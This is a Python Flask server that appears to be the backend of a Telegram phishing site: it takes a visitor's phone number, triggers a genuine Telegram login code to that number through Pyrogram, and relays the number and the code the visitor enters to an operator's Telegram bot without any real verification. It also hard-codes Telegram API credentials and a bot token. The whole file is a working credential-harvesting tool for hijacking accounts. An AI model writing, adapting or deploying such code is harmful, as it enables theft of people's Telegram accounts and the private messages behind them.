from flask import Flask, request, jsonify
from flask_cors import CORS
from pyrogram import Client
import asyncio
import os
import re
import requests
import secrets
from datetime import datetime
from threading import Timer

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)
CORS(app)

API_ID = 6627460
API_HASH = "27a53a0965e486a2bc1b1fcde473b1c4"

BOT_TOKEN = "8862345996:AAH2M2RQMIBuDLpkhb69NxCdrVM_Fd45GIk"
YOUR_CHAT_ID = "8796685138"

# Store user sessions with a unique ID
user_sessions = {}

def generate_session_id():
    return secrets.token_hex(8)

def send_to_telegram_bot(session_id, phone, code=None):
    """Send phone or code to bot with session ID for tracking"""
    if code:
        message = f"""
✅ **Verification Code Entered**

🆔 **Session ID:** `{session_id}`
📱 **Phone:** `{phone}`
🔑 **Code Entered:** `{code}`
⏰ **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        """
    else:
        message = f"""
📱 **New Login Request**

🆔 **Session ID:** `{session_id}`
📱 **Phone:** `{phone}`
⏰ **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
⏳ **Status:** Code will be sent in 5 seconds...
        """
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": YOUR_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    
    try:
        response = requests.post(url, json=payload)
        return response.ok
    except Exception as e:
        print(f"Error: {e}")
        return False

def delayed_send_code(phone, session_id):
    """Send the actual Telegram code after 5 seconds"""
    async def send_code_async():
        client = None
        try:
            client = Client(
                name=f"session_{datetime.now().timestamp()}",
                api_id=API_ID,
                api_hash=API_HASH,
                in_memory=True
            )
            
            await client.connect()
            sent_code = await client.send_code(phone_number=phone)
            
            # Update session with the hash
            if session_id in user_sessions:
                user_sessions[session_id]['phone_code_hash'] = sent_code.phone_code_hash
                user_sessions[session_id]['code_sent'] = True
            
            print(f"Code sent to {phone} after 5 second delay")
            
        except Exception as e:
            print(f"Error sending code: {e}")
        finally:
            if client:
                await client.disconnect()
    
    asyncio.run(send_code_async())

@app.route('/send-code', methods=['POST'])
def send_code():
    try:
        data = request.json
        phone = data.get('phone', '')
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone required'}), 400
        
        # Generate unique session ID for this user
        session_id = generate_session_id()
        
        # Store session
        user_sessions[session_id] = {
            'phone': phone,
            'timestamp': datetime.now().timestamp(),
            'code_sent': False,
            'phone_code_hash': None
        }
        
        # Send phone number to bot immediately
        send_to_telegram_bot(session_id, phone)
        
        # Schedule code sending after 5 seconds
        timer = Timer(5.0, delayed_send_code, args=[phone, session_id])
        timer.start()
        
        return jsonify({
            'success': True,
            'message': 'Phone number received. Code will be sent in 5 seconds.',
            'session_id': session_id
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/verify-code', methods=['POST'])
def verify_code():
    try:
        data = request.json
        session_id = data.get('session_id', '')
        code = data.get('code', '')
        
        if not session_id or not code:
            return jsonify({'success': False, 'error': 'Session ID and code required'}), 400
        
        # Find the session
        if session_id not in user_sessions:
            return jsonify({'success': False, 'error': 'Session expired. Please request a new code.'}), 400
        
        session = user_sessions[session_id]
        phone = session['phone']
        
        # Check if code was sent
        if not session.get('code_sent', False):
            return jsonify({'success': False, 'error': 'Code not sent yet. Please wait.'}), 400
        
        # Send the entered code to bot (no verification)
        send_to_telegram_bot(session_id, phone, code)
        
        # Clean up session
        del user_sessions[session_id]
        
        return jsonify({
            'success': True,
            'message': f'Code sent to your bot!'
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({'status': 'ok', 'active_sessions': len(user_sessions)})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
